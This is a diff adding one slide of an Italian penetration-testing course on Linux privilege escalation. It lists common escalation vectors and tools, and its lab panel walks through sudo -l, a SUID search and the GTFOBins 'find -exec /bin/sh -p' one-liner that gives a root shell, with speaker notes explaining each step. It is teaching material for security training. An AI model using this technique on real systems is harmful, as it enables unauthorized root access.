@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 5: Post-Exploitation - Privilege Escalation</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 5: Post-Exploitation</h1>
+        <div class="subtitle">Slide 5.2: Privilege Escalation</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: Da www-data a Root</div>
+                <div class="card-text">
+                    <p>L'utente <code class="tech-term">www-data</code> ha privilegi limitati. Vogliamo diventare <code class="tech-term">root</code> per controllo totale.</p>
+                    <br>
+                    <p><strong>Vettori comuni di PrivEsc:</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><span class="text-red">SUID binaries</span> - File con bit SUID</li>
+                        <li><span class="text-red">Sudo misconfig</span> - sudo -l</li>
+                        <li><span class="text-red">Kernel exploits</span> - Dirty COW, etc.</li>
+                        <li><span class="text-yellow">Cron jobs</span> - Script eseguiti come root</li>
+                        <li><span class="text-yellow">Writable /etc/passwd</span></li>
+                        <li><span class="text-yellow">Capabilities</span> - getcap</li>
+                        <li><span class="text-green">Password reuse</span> - su con pass DB</li>
+                    </ul>
+                    <br>
+                    <p><strong>Tool automatici:</strong></p>
+                    <ul style="margin-left: 20px;">
+                        <li><code class="tech-term">linpeas.sh</code> - Il più completo</li>
+                        <li><code class="tech-term">LinEnum.sh</code> - Classico</li>
+                        <li><code class="tech-term">linux-exploit-suggester</code></li>
+                    </ul>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> Prima di usare linpeas, provate sempre sudo -l e SUID manualmente. Spesso bastano 2 comandi per trovare il vettore.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: Ricerca Vettori PrivEsc</div>
+                <div class="card-text">
+                    <p><strong>Check sudo permissions:</strong></p>
+                    <div class="code-box"><span class="text-green">www-data@target:$</span> sudo -l
+<span class="text-red">[sudo] password for www-data: </span>
+<span class="text-yellow"># www-data non ha sudo... proviamo altro</span></div>
+                    <br>
+                    <p><strong>Cercare SUID binaries:</strong></p>
+                    <div class="code-box"><span class="text-green">www-data@target:$</span> find / -perm -4000 2>/dev/null
+
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+<span class="text-red">/usr/bin/find</span>  ← INTERESSANTE!</div>
+                    <br>
+                    <p><strong>Exploit SUID find (GTFOBins):</strong></p>
+                    <div class="code-box"><span class="text-green">www-data@target:$</span> /usr/bin/find . -exec /bin/sh -p \; -quit
+
+<span class="text-red">#</span> whoami
+<span class="text-green">root</span>
+
+<span class="text-red">#</span> id
+uid=33(www-data) gid=33(www-data) <span class="text-green">euid=0(root)</span></div>
+                    <br>
+                    <p><span class="text-green">✓ ROOT OTTENUTO!</span></p>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Il cuore del post-exploitation: diventare root. A sinistra, i vettori più comuni.
+        A destra, il processo. Prima proviamo sudo -l - fallisce, www-data non ha configurazioni sudo.
+        Poi cerchiamo SUID binaries con find. Notate il 2>/dev/null che nasconde gli errori di permesso.
+        Troviamo /usr/bin/find con SUID! Questo è un misconfiguration classica.
+        Andiamo su GTFOBins (gtfobins.github.io) e cerchiamo 'find'. Ci dice esattamente come sfruttarlo.
+        Il comando -exec spawna una shell, e -p preserva i privilegi. Risultato: siamo root!
+        euid=0 significa 'effective user id = root'. Game over, controllo totale."
+    -->
+
+    <script>const slideNumero = 33;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
